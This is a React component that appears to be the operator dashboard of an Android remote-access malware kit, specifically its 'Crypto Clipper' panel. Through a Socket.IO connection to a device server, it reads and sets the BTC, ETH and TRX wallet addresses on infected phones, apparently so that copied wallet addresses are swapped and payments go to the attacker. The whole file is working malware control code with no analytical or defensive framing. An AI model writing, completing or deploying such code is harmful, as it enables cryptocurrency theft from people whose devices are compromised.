"use client";

import { AndroidDevice } from "@/types";
import { useState, useEffect, useRef, useCallback } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Save, RefreshCw, Loader2, Wallet, Coins, CheckCircle2, XCircle } from "lucide-react";
import { io, Socket } from "socket.io-client";

interface CryptoClipperProps {
  device: AndroidDevice;
}

// Validation functions for crypto addresses
const validateBTCAddress = (address: string): boolean => {
  if (!address || address.trim().length === 0) return false;
  
  const addr = address.trim();
  
  // Legacy addresses (P2PKH) - start with 1, 25-34 chars
  if (addr.match(/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/)) {
    return true;
  }
  
  // P2SH addresses - start with 3, 25-34 chars
  if (addr.match(/^3[a-km-zA-HJ-NP-Z1-9]{25,34}$/)) {
    return true;
  }
  
  // Bech32 SegWit addresses - start with bc1, 14-74 chars
  if (addr.match(/^bc1[a-z0-9]{13,72}$/i)) {
    return true;
  }
  
  // Taproot addresses - start with bc1p, 62 chars
  if (addr.match(/^bc1p[a-z0-9]{58}$/i)) {
    return true;
  }
  
  return false;
};

const validateETHAddress = (address: string): boolean => {
  if (!address || address.trim().length === 0) return false;
  
  const addr = address.trim();
  
  // Ethereum addresses start with 0x and are 42 characters (0x + 40 hex chars)
  // Case-insensitive but we'll accept both
  if (addr.match(/^0x[a-fA-F0-9]{40}$/)) {
    return true;
  }
  
  return false;
};

const validateTRXAddress = (address: string): boolean => {
  if (!address || address.trim().length === 0) return false;
  
  const addr = address.trim();
  
  // Tron addresses start with T and are 34 characters, Base58 encoded
  if (addr.match(/^T[1-9A-HJ-NP-Za-km-z]{33}$/)) {
    return true;
  }
  
  return false;
};

export default function CryptoClipper({ device }: CryptoClipperProps) {
  const [btcAddress, setBtcAddress] = useState<string>("");
  const [ethAddress, setEthAddress] = useState<string>("");
  const [trxAddress, setTrxAddress] = useState<string>("");
  const [currentBtcAddress, setCurrentBtcAddress] = useState<string>("");
  const [currentEthAddress, setCurrentEthAddress] = useState<string>("");
  const [currentTrxAddress, setCurrentTrxAddress] = useState<string>("");
  const [loading, setLoading] = useState(false);
  const [savingBtc, setSavingBtc] = useState(false);
  const [savingEth, setSavingEth] = useState(false);
  const [savingTrx, setSavingTrx] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [btcError, setBtcError] = useState<string | null>(null);
  const [ethError, setEthError] = useState<string | null>(null);
  const [trxError, setTrxError] = useState<string | null>(null);
  
  const socketRef = useRef<Socket | null>(null);
  const DEVICE_SERVER_URL = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";

  // Setup Socket.IO connection
  useEffect(() => {
    console.log(`🔌 [CryptoClipper] Setting up socket for device: ${device.id}`);
    
    if (!socketRef.current) {
      const socket = io(DEVICE_SERVER_URL, {
        transports: ["websocket", "polling"],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: Infinity,
      });

      socket.on("connect", () => {
        console.log("✅ CryptoClipper connected to device-server.js");
      });

      socket.on("disconnect", () => {
        console.log("❌ CryptoClipper disconnected from device-server.js");
      });

      socketRef.current = socket;
    }

    const socket = socketRef.current;
    socket.off("device_event");
    socket.off("command-error");
    socket.off("command-sent");

    // Listen for activewalletaddress-result events
    socket.on("device_event", (event: any) => {
      if (event.device_id !== device.id) return;

      // Handle activewalletaddress-result
      if (event.event === "activewalletaddress_result") {
        // Clear timeout if it exists
        if (socketRef.current && (socketRef.current as any)._getWalletAddressTimeout) {
          clearTimeout((socketRef.current as any)._getWalletAddressTimeout);
          delete (socketRef.current as any)._getWalletAddressTimeout;
        }
        
        setLoading(false);
        
        if (event.data && (event.data.error || event.data.success === false)) {
          setError(event.data.error || "Failed to get wallet addresses");
        } else {
          // Extract BTC, ETH, and TRX addresses from event.data
          const data = event.data || {};
          const btc = String(data.btc || "").trim();
          const eth = String(data.eth || "").trim();
          const trx = String(data.trx || "").trim();
          
          // Set current addresses on device (for display)
          setCurrentBtcAddress(btc);
          setCurrentEthAddress(eth);
          setCurrentTrxAddress(trx);
          
          // Also populate input fields with current addresses
          setBtcAddress(btc);
          setEthAddress(eth);
          setTrxAddress(trx);
          
          // Clear validation errors when addresses are loaded
          setBtcError(null);
          setEthError(null);
          setTrxError(null);
          setError(null);
        }
      }

      // Handle set-wallet-address-result
      if (event.event === "set_wallet_address_result") {
        console.log("💰 [CryptoClipper] Processing set-wallet-address-result:", event.data);
        
        // Clear timeouts if they exist
        if (socketRef.current && (socketRef.current as any)._saveBtcTimeout) {
          clearTimeout((socketRef.current as any)._saveBtcTimeout);
          delete (socketRef.current as any)._saveBtcTimeout;
        }
        if (socketRef.current && (socketRef.current as any)._saveEthTimeout) {
          clearTimeout((socketRef.current as any)._saveEthTimeout);
          delete (socketRef.current as any)._saveEthTimeout;
        }
        if (socketRef.current && (socketRef.current as any)._saveTrxTimeout) {
          clearTimeout((socketRef.current as any)._saveTrxTimeout);
          delete (socketRef.current as any)._saveTrxTimeout;
        }
        
        setSavingBtc(false);
        setSavingEth(false);
        setSavingTrx(false);
        
        if (event.data && (event.data.error || event.data.success === false)) {
          setError(event.data.error || "Failed to save wallet address");
          setSuccess(null);
        } else {
          setError(null);
          const addressType = event.data?.type || event.data?.addressType || "";
          setSuccess(`${addressType.toUpperCase()} address saved successfully!`);
          setTimeout(() => setSuccess(null), 3000);
          
          // Update current addresses based on what was saved
          if (addressType.toLowerCase() === "btc") {
            setCurrentBtcAddress(btcAddress);
          } else if (addressType.toLowerCase() === "eth") {
            setCurrentEthAddress(ethAddress);
          } else if (addressType.toLowerCase() === "trx") {
            setCurrentTrxAddress(trxAddress);
          }
          
          // Refresh addresses from device to ensure sync
          setTimeout(() => {
            handleGetWalletAddress();
          }, 500);
        }
      }
    });

    socket.on("command-error", (error: any) => {
      if (error.deviceId === device.id) {
        console.error("❌ [CryptoClipper] Command error:", error);
        setError(error.error || "Failed to send command");
        setLoading(false);
      }
    });

    socket.on("command-sent", (data: any) => {
      if (data.deviceId === device.id) {
        if (data.command === "getwalletaddress") {
          console.log("✅ [CryptoClipper] Command sent, waiting for response...");
          setLoading(true);
        } else if (data.command === "setwalletaddress") {
          console.log("✅ [CryptoClipper] Save command sent, waiting for response...");
          // Determine which address is being saved based on param
          const param = data.param || "";
          if (param.includes("btc") || param.startsWith("btc")) {
            setSavingBtc(true);
          } else if (param.includes("eth") || param.startsWith("eth")) {
            setSavingEth(true);
          } else if (param.includes("trx") || param.startsWith("trx")) {
            setSavingTrx(true);
          }
        }
      }
    });

    return () => {
      if (socketRef.current) {
        socketRef.current.off("device_event");
        socketRef.current.off("command-error");
        socketRef.current.off("command-sent");
      }
    };
  }, [device.id, DEVICE_SERVER_URL]);

  // Handle Get Wallet Address
  const handleGetWalletAddress = useCallback(() => {
    if (!socketRef.current || !socketRef.current.connected) {
      setError("Socket not connected");
      return;
    }

    setLoading(true);
    setError(null);

    console.log(`📤 [CryptoClipper] Sending getwalletaddress command`);
    
    // Set timeout to clear loading state if no response (3 seconds)
    const timeoutId = setTimeout(() => {
      console.log("✅ [CryptoClipper] Get wallet address - assuming success after timeout");
      setLoading(false);
    }, 3000);

    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "getwalletaddress",
    });

    // Store timeout ID
    (socketRef.current as any)._getWalletAddressTimeout = timeoutId;
  }, [device.id]);

  // Load wallet addresses immediately when component is rendered/opened
  useEffect(() => {
    // Small delay to ensure socket is ready
    const timer = setTimeout(() => {
      if (device.status === "online" && socketRef.current && socketRef.current.connected) {
        console.log("📤 [CryptoClipper] Component opened, fetching wallet addresses...");
        handleGetWalletAddress();
      }
    }, 100);

    return () => clearTimeout(timer);
  }, [device.status, device.id, handleGetWalletAddress]);

  // Handle Save BTC Address
  const handleSaveBtc = () => {
    if (!socketRef.current || !socketRef.current.connected) {
      setError("Socket not connected");
      return;
    }

    const trimmedAddress = btcAddress.trim();
    
    if (!trimmedAddress) {
      setBtcError("BTC address is required");
      return;
    }

    if (!validateBTCAddress(trimmedAddress)) {
      setBtcError("Invalid BTC address format. Must start with 1, 3, or bc1");
      return;
    }

    setBtcError(null);
    setError(null);
    setSuccess(null);
    setSavingBtc(true);

    console.log(`📤 [CryptoClipper] Sending setwalletaddress command for BTC: ${btcAddress}`);
    
    const timeoutId = setTimeout(() => {
      console.log("✅ [CryptoClipper] Set BTC address - assuming success after timeout");
      setSavingBtc(false);
      setSuccess("BTC address saved successfully!");
      setTimeout(() => setSuccess(null), 3000);
    }, 3000);

    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "setwalletaddress",
      param: `btc|${btcAddress}`,
    });

    (socketRef.current as any)._saveBtcTimeout = timeoutId;
  };

  // Handle Save ETH Address
  const handleSaveEth = () => {
    if (!socketRef.current || !socketRef.current.connected) {
      setError("Socket not connected");
      return;
    }

    const trimmedAddress = ethAddress.trim();
    
    if (!trimmedAddress) {
      setEthError("ETH address is required");
      return;
    }

    if (!validateETHAddress(trimmedAddress)) {
      setEthError("Invalid ETH address format. Must start with 0x and be 42 characters");
      return;
    }

    setEthError(null);
    setError(null);
    setSuccess(null);
    setSavingEth(true);

    console.log(`📤 [CryptoClipper] Sending setwalletaddress command for ETH: ${ethAddress}`);
    
    const timeoutId = setTimeout(() => {
      console.log("✅ [CryptoClipper] Set ETH address - assuming success after timeout");
      setSavingEth(false);
      setSuccess("ETH address saved successfully!");
      setTimeout(() => setSuccess(null), 3000);
    }, 3000);

    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "setwalletaddress",
      param: `eth|${ethAddress}`,
    });

    (socketRef.current as any)._saveEthTimeout = timeoutId;
  };

  // Handle Save TRX Address
  const handleSaveTrx = () => {
    if (!socketRef.current || !socketRef.current.connected) {
      setError("Socket not connected");
      return;
    }

    const trimmedAddress = trxAddress.trim();
    
    if (!trimmedAddress) {
      setTrxError("TRX address is required");
      return;
    }

    if (!validateTRXAddress(trimmedAddress)) {
      setTrxError("Invalid TRX address format. Must start with T and be 34 characters");
      return;
    }

    setTrxError(null);
    setError(null);
    setSuccess(null);
    setSavingTrx(true);

    console.log(`📤 [CryptoClipper] Sending setwalletaddress command for TRX: ${trxAddress}`);
    
    const timeoutId = setTimeout(() => {
      console.log("✅ [CryptoClipper] Set TRX address - assuming success after timeout");
      setSavingTrx(false);
      setSuccess("TRX address saved successfully!");
      setTimeout(() => setSuccess(null), 3000);
    }, 3000);

    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "setwalletaddress",
      param: `trx|${trxAddress}`,
    });

    (socketRef.current as any)._saveTrxTimeout = timeoutId;
  };

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Wallet className="h-6 w-6" />
          <h2 className="text-2xl font-semibold">Crypto Clipper</h2>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={handleGetWalletAddress}
          disabled={loading || device.status !== "online"}
        >
          {loading ? (
            <Loader2 className="h-4 w-4 mr-2 animate-spin" />
          ) : (
            <RefreshCw className="h-4 w-4 mr-2" />
          )}
          Refresh
        </Button>
      </div>

      {error && (
        <div className="bg-red-500/10 border border-red-500/20 p-3 rounded-md">
          <p className="text-sm text-red-600 dark:text-red-400">{error}</p>
        </div>
      )}

      {success && (
        <div className="bg-green-500/10 border border-green-500/20 p-3 rounded-md">
          <p className="text-sm text-green-600 dark:text-green-400">{success}</p>
        </div>
      )}

      {/* Current Wallet Addresses Section */}
      <Card className="border-0 shadow-none bg-card/50">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <CheckCircle2 className="h-5 w-5 text-green-500" />
            Current Wallet Addresses on Device
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* BTC Current Address */}
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="text-sm font-medium text-orange-500">BTC:</span>
              {currentBtcAddress && currentBtcAddress.trim() ? (
                <div className="flex items-center gap-2 flex-1">
                  <code className="text-xs font-mono bg-muted px-2 py-1 rounded flex-1 break-all">
                    {currentBtcAddress}
                  </code>
                  <CheckCircle2 className="h-4 w-4 text-green-500 flex-shrink-0" />
                </div>
              ) : (
                <div className="flex items-center gap-2 text-muted-foreground">
                  <span className="text-xs italic">Not set</span>
                  <XCircle className="h-4 w-4 text-muted-foreground" />
                </div>
              )}
            </div>
          </div>

          {/* ETH Current Address */}
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="text-sm font-medium text-blue-500">ETH:</span>
              {currentEthAddress && currentEthAddress.trim() ? (
                <div className="flex items-center gap-2 flex-1">
                  <code className="text-xs font-mono bg-muted px-2 py-1 rounded flex-1 break-all">
                    {currentEthAddress}
                  </code>
                  <CheckCircle2 className="h-4 w-4 text-green-500 flex-shrink-0" />
                </div>
              ) : (
                <div className="flex items-center gap-2 text-muted-foreground">
                  <span className="text-xs italic">Not set</span>
                  <XCircle className="h-4 w-4 text-muted-foreground" />
                </div>
              )}
            </div>
          </div>

          {/* TRX Current Address */}
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="text-sm font-medium text-red-500">TRX:</span>
              {currentTrxAddress && currentTrxAddress.trim() ? (
                <div className="flex items-center gap-2 flex-1">
                  <code className="text-xs font-mono bg-muted px-2 py-1 rounded flex-1 break-all">
                    {currentTrxAddress}
                  </code>
                  <CheckCircle2 className="h-4 w-4 text-green-500 flex-shrink-0" />
                </div>
              ) : (
                <div className="flex items-center gap-2 text-muted-foreground">
                  <span className="text-xs italic">Not set</span>
                  <XCircle className="h-4 w-4 text-muted-foreground" />
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      <Card className="border-0 shadow-none bg-card/50">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Coins className="h-5 w-5" />
            Wallet Addresses
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          {/* BTC Address */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium flex items-center gap-2">
                <span className="font-bold text-orange-500">BTC</span>
                Bitcoin Address
              </label>
              {btcAddress.trim() && (
                <span className="text-xs text-muted-foreground bg-muted px-2 py-1 rounded">
                  Currently set on device
                </span>
              )}
            </div>
            <div className="flex items-center gap-2">
              <div className="flex-1 space-y-1">
                <Input
                  type="text"
                  placeholder="Enter BTC address (e.g., bc1... or 1...)"
                  value={btcAddress}
                  onChange={(e) => {
                    const value = e.target.value;
                    setBtcAddress(value);
                    if (value.trim() && !validateBTCAddress(value)) {
                      setBtcError("Invalid BTC address format");
                    } else {
                      setBtcError(null);
                    }
                  }}
                  onBlur={(e) => {
                    const value = e.target.value.trim();
                    if (value && !validateBTCAddress(value)) {
                      setBtcError("Invalid BTC address format. Must start with 1, 3, or bc1");
                    }
                  }}
                  disabled={loading || savingBtc}
                  className={`font-mono text-sm ${btcError ? "border-red-500" : ""}`}
                />
                {btcError && (
                  <p className="text-xs text-red-600 dark:text-red-400">{btcError}</p>
                )}
                {btcAddress.trim() && !btcError && validateBTCAddress(btcAddress) && (
                  <p className="text-xs text-green-600 dark:text-green-400">✓ Valid BTC address</p>
                )}
              </div>
              <Button
                onClick={handleSaveBtc}
                disabled={savingBtc || !btcAddress.trim() || device.status !== "online" || !!btcError}
                size="sm"
              >
                {savingBtc ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <>
                    <Save className="h-4 w-4 mr-2" />
                    Save
                  </>
                )}
              </Button>
            </div>
          </div>

          {/* ETH Address */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium flex items-center gap-2">
                <span className="font-bold text-blue-500">ETH</span>
                Ethereum Address
              </label>
              {ethAddress.trim() && (
                <span className="text-xs text-muted-foreground bg-muted px-2 py-1 rounded">
                  Currently set on device
                </span>
              )}
            </div>
            <div className="flex items-center gap-2">
              <div className="flex-1 space-y-1">
                <Input
                  type="text"
                  placeholder="Enter ETH address (e.g., 0x...)"
                  value={ethAddress}
                  onChange={(e) => {
                    const value = e.target.value;
                    setEthAddress(value);
                    if (value.trim() && !validateETHAddress(value)) {
                      setEthError("Invalid ETH address format");
                    } else {
                      setEthError(null);
                    }
                  }}
                  onBlur={(e) => {
                    const value = e.target.value.trim();
                    if (value && !validateETHAddress(value)) {
                      setEthError("Invalid ETH address format. Must start with 0x and be 42 characters");
                    }
                  }}
                  disabled={loading || savingEth}
                  className={`font-mono text-sm ${ethError ? "border-red-500" : ""}`}
                />
                {ethError && (
                  <p className="text-xs text-red-600 dark:text-red-400">{ethError}</p>
                )}
                {ethAddress.trim() && !ethError && validateETHAddress(ethAddress) && (
                  <p className="text-xs text-green-600 dark:text-green-400">✓ Valid ETH address</p>
                )}
              </div>
              <Button
                onClick={handleSaveEth}
                disabled={savingEth || !ethAddress.trim() || device.status !== "online" || !!ethError}
                size="sm"
              >
                {savingEth ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <>
                    <Save className="h-4 w-4 mr-2" />
                    Save
                  </>
                )}
              </Button>
            </div>
          </div>

          {/* TRX Address */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium flex items-center gap-2">
                <span className="font-bold text-red-500">TRX</span>
                Tron Address
              </label>
              {trxAddress.trim() && (
                <span className="text-xs text-muted-foreground bg-muted px-2 py-1 rounded">
                  Currently set on device
                </span>
              )}
            </div>
            <div className="flex items-center gap-2">
              <div className="flex-1 space-y-1">
                <Input
                  type="text"
                  placeholder="Enter TRX address (e.g., T...)"
                  value={trxAddress}
                  onChange={(e) => {
                    const value = e.target.value;
                    setTrxAddress(value);
                    if (value.trim() && !validateTRXAddress(value)) {
                      setTrxError("Invalid TRX address format");
                    } else {
                      setTrxError(null);
                    }
                  }}
                  onBlur={(e) => {
                    const value = e.target.value.trim();
                    if (value && !validateTRXAddress(value)) {
                      setTrxError("Invalid TRX address format. Must start with T and be 34 characters");
                    }
                  }}
                  disabled={loading || savingTrx}
                  className={`font-mono text-sm ${trxError ? "border-red-500" : ""}`}
                />
                {trxError && (
                  <p className="text-xs text-red-600 dark:text-red-400">{trxError}</p>
                )}
                {trxAddress.trim() && !trxError && validateTRXAddress(trxAddress) && (
                  <p className="text-xs text-green-600 dark:text-green-400">✓ Valid TRX address</p>
                )}
              </div>
              <Button
                onClick={handleSaveTrx}
                disabled={savingTrx || !trxAddress.trim() || device.status !== "online" || !!trxError}
                size="sm"
              >
                {savingTrx ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <>
                    <Save className="h-4 w-4 mr-2" />
                    Save
                  </>
                )}
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {device.status !== "online" && (
        <div className="flex flex-col items-center justify-center text-center p-8 bg-muted/50 rounded-lg">
          <div className="p-4 rounded-full bg-muted mb-4">
            <Wallet className="h-12 w-12 text-muted-foreground" />
          </div>
          <p className="text-lg font-medium mb-2">Device is offline</p>
          <p className="text-sm text-muted-foreground">Connect device to use Crypto Clipper</p>
        </div>
      )}
    </div>
  );
}

